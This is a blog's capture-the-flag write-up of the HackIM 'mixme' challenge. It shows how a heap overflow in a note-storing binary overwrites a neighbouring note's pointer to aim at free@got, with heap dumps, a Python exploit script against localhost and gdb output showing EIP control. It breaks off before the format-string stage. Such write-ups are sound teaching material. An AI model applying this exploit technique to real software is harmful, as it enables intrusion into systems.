
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>HackIM CTF - Mixme - staring into /dev/null</title>
  <meta name="author" content="barrebas">

  
  <meta name="description" content="mixme was a 400 points exploitation challenge of the NullCon HackIM ctf. We solved it with just 20 minutes on the clock! When started, mixme present &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">staring into /dev/null</a></h1>
  
    <h2>barrebas</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:barrebas.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">HackIM CTF - Mixme</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-11T18:52:35+01:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>6:52 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p><code>mixme</code> was a 400 points exploitation challenge of the NullCon HackIM ctf. We solved it with just 20 minutes on the clock!</p>

<!-- more -->


<p>When started, <code>mixme</code> present the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>==========================================
</span><span class='line'>======== Uncle Podger's Data Store =======
</span><span class='line'>==========================================
</span><span class='line'>
</span><span class='line'>Select op (store/get/edit/exit): store
</span><span class='line'>Name: a
</span><span class='line'>Size: 4
</span><span class='line'>Enter data: AAAA
</span><span class='line'>Select op (store/get/edit/exit): get
</span><span class='line'>Name: a
</span><span class='line'>Size: 4
</span><span class='line'>AAAASelect op (store/get/edit/exit): get
</span><span class='line'>Name: a
</span><span class='line'>Size: 4
</span><span class='line'>Not found
</span><span class='line'>Select op (store/get/edit/exit): Invalid input
</span><span class='line'>Select op (store/get/edit/exit): </span></code></pre></td></tr></table></div></figure>


<p>Again, some kind of note storage. The binary was first reverse-engineered by superkojiman, who immediately noticed something odd: upon <code>get</code>ing a note, the program erases the note by <code>free()</code>ing the memory and NULLing the first few bytes. The rest of the bytes were left intact. This led us to think about possible use-after-free scenarios. Turns out it was something different&hellip;</p>

<p>I started tinkering with the binary. I could store notes and get them back, but only if I supplied the right size. However, I noticed that I could <em>edit</em> a note with a larger value than was allocated. The heap looks like this after allocating three notes <code>a</code>, <code>b</code> and <code>c</code> with length 4 and contents <code>AAAA</code>, <code>BBBB</code>, and <code>CCCC</code>, respectively:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># allocated three notes, in heap:
</span><span class='line'>0x8314000:    0x00000000  0x00000029  0x44414548  0x00000000
</span><span class='line'>0x8314010:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8314020:    0x08314030  0x083140a0  0x00000000  0x00000029
</span><span class='line'>0x8314030:    0x00000061  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8314040:    0x00000004  0x08314058  0x08314068  0x08314008
</span><span class='line'>0x8314050:    0x00000000  0x00000011  0x41414141  0x00000000
</span><span class='line'>0x8314060:    0x00000000  0x00000029  0x00000062  0x00000000
</span><span class='line'>0x8314070:    0x00000000  0x00000000  0x00000004  0x08314090
</span><span class='line'>0x8314080:    0x083140a0  0x08314030  0x00000000  0x00000011
</span><span class='line'>0x8314090:    0x42424242  0x00000000  0x00000000  0x00000029
</span><span class='line'>0x83140a0:    0x00000063  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x83140b0:    0x00000004  0x083140c8  0x08314008  0x08314068
</span><span class='line'>0x83140c0:    0x00000000  0x00000011  0x43434343  0x00000000
</span><span class='line'>0x83140d0:    0x00000000  0x00020f31  0x00000000  0x00000000
</span><span class='line'>0x83140e0:    0x00000000  0x00000000  0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>


<p>At <code>0x8314030</code>, we see the first note&rsquo;s name, <code>a</code>. The zeroeth note is called <code>HEAD</code> and precedes our first note. Each note is contained within a struct, which contains pointers to the previous and next note (a doubly linked list). The meta-data for note <code>a</code> contains this pointer: <code>0x08314058</code>, which points to the data associated with that note: <code>AAAA</code>. The meta-data for the note looks something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">note_info</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">;</span>
</span><span class='line'>  <span class="n">note_info</span> <span class="o">*</span><span class="n">next_note</span><span class="p">;</span>
</span><span class='line'>  <span class="n">note_info</span> <span class="o">*</span><span class="n">prev_note</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>This also is true for the next note, <code>b</code>, which is immediately after <code>a</code> in memory. We can overwrite the meta-data of note <code>b</code> by editing note <code>a</code>.</p>

<h2>Overflowing the heap</h2>

<p>If we supply 40 bytes when editing <code>a</code> and supplying forty times <code>0x41</code>, we overwrite several parts of the meta-data of note <code>b</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># after editing &#39;a&#39; with 40 bytes where 4 is allocated:</span>
</span><span class='line'><span class="mh">0x8314000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x44414548</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314020</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x083140a0</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x8314030</span><span class="o">:</span> <span class="mh">0x00000061</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314040</span><span class="o">:</span> <span class="mh">0x00000004</span>  <span class="mh">0x08314058</span>  <span class="mh">0x08314068</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x8314050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314060</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314070</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314080</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x08314008</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>
</span><span class='line'><span class="mh">0x8314090</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140a0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140b0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x083140c8</span>  <span class="mh">0x08314008</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x83140c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00020f31</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140e0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>If we now try to <code>get</code> note <code>b</code>, the binary will segfault because the pointer to the note&rsquo;s data is set to <code>0x41414141</code>. We can use this to make note <code>b</code> point to <code>free@got</code> with a bit of python. The binary is started using socat to make it listen on a port.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># set &#39;a&#39; with large buffer, overwriting meta-data of &#39;b&#39;:</span>
</span><span class='line'><span class="mh">0x8314000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x44414548</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314020</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x083140a0</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x8314030</span><span class="o">:</span> <span class="mh">0x00000061</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314040</span><span class="o">:</span> <span class="mh">0x00000004</span>  <span class="mh">0x08314058</span>  <span class="mh">0x08314068</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x8314050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314060</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000062</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314070</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x00000024</span>  <span class="mh">0x08314090</span>
</span><span class='line'><span class="mh">0x8314080</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x08314008</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>
</span><span class='line'><span class="mh">0x8314090</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140a0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140b0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x083140c8</span>  <span class="mh">0x08314008</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x83140c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00020f31</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140e0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>Notice that I&rsquo;ve kept the bytes at <code>0x8314064</code> and <code>0x8314068</code> the same: <code>0x00000029 0x00000062</code>. If these are overwritten, then the binary cannot find note <code>b</code> anymore, which effectively stops our attack! I overwrote the pointer to the data with <code>0x804b020</code>. This is the pointer to <code>free()</code> in the Global Offset Table. Remember, after every <code>get</code> sent to the binary, <code>free()</code> is called. By overwriting the pointer to the note data, we can set any memory to arbitrary values with an <code>edit b</code> command to the binary!</p>

<h2>Control of execution</h2>

<p>I tested this hypothesis with the following python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">string</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># function to send commands to the binary</span>
</span><span class='line'><span class="k">def</span> <span class="nf">z</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connect to remote host</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">9005</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive banner</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ask the binary to store three notes</span>
</span><span class='line'><span class="c"># we&#39;ll overflow a into b later on</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;a&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;AAAA&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;b&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;BBBB&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;c&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;CCCC&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># edit a with a large value</span>
</span><span class='line'><span class="c"># this overflows and overwrites the note_info struct of b</span>
</span><span class='line'><span class="c"># the pointer to the data is overwriting with free@got</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] overflowing a to set b to free@got&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;40&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x29\x00\x00\x00\x62\x00\x00\x00</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b020</span><span class="p">))</span>
</span><span class='line'><span class="c">#       ^ overflow    ^ restore 0x29, &#39;b&#39;               ^ size of b ^ free@got</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overwrite free@got with printf</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] replacing free() with printf()&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;b&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;BBBB&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;get&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This made the binary crash. The coredump reported the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0x843b0c8</span>   <span class="mh">0x843b0c8</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0x843b0c8</span>   <span class="mh">0x843b0c8</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0x4</span> <span class="mh">0x4</span>
</span><span class='line'><span class="n">ebx</span>            <span class="mh">0xb779cff4</span>  <span class="mh">0xb779cff4</span>
</span><span class='line'><span class="n">esp</span>            <span class="mh">0xbf95245c</span>  <span class="mh">0xbf95245c</span>
</span><span class='line'><span class="n">ebp</span>            <span class="mh">0xbf952498</span>  <span class="mh">0xbf952498</span>
</span><span class='line'><span class="n">esi</span>            <span class="mh">0x0</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">edi</span>            <span class="mh">0x0</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">eip</span>            <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="n">eflags</span>         <span class="mh">0x10207</span> <span class="p">[</span> <span class="n">CF</span> <span class="n">PF</span> <span class="n">IF</span> <span class="n">RF</span> <span class="p">]</span>
</span><span class='line'><span class="n">cs</span>             <span class="mh">0x73</span>    <span class="mh">0x73</span>
</span><span class='line'><span class="n">ss</span>             <span class="mh">0x7b</span>    <span class="mh">0x7b</span>
</span><span class='line'><span class="n">ds</span>             <span class="mh">0x7b</span>    <span class="mh">0x7b</span>
</span><span class='line'><span class="n">es</span>             <span class="mh">0x7b</span>    <span class="mh">0x7b</span>
</span><span class='line'><span class="n">fs</span>             <span class="mh">0x0</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">gs</span>             <span class="mh">0x33</span>    <span class="mh">0x33</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">p</span> <span class="n">system</span>
</span><span class='line'><span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7636060</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">&gt;</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>
</span><span class='line'><span class="mh">0xbf95245c</span><span class="p">:</span>    <span class="mh">0x08048bb8</span>  <span class="mh">0x0843b0c8</span>  <span class="mh">0x0843b0c8</span>  <span class="mh">0x00000004</span>
</span><span class='line'>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">x</span> <span class="err">$</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x843b0c8</span><span class="p">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>Bloody awesome! We not only have control over EIP, but also eax, ecx and the first argument on the stack point to memory that we control. This will come in handy later.</p>

<h2>Turning the heap overflow into a format string vulnerability</h2>

